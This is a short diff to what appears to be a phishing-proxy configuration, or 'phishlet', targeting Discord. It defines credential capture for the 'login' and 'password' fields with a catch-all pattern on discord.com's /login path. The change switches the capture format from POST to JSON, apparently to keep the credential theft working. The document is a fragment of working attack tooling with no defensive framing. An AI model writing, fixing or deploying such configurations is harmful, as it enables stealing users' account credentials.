@@ -15,11 +15,11 @@ credentials:
   username:
     key: 'login'
     search: '(.*)'
-    type: 'post'
+    type: 'json'
   password:
     key: 'password'
     search: '(.*)'
-    type: 'post'
+    type: 'json'
 login:
   domain: 'discord.com'
   path: '/login'
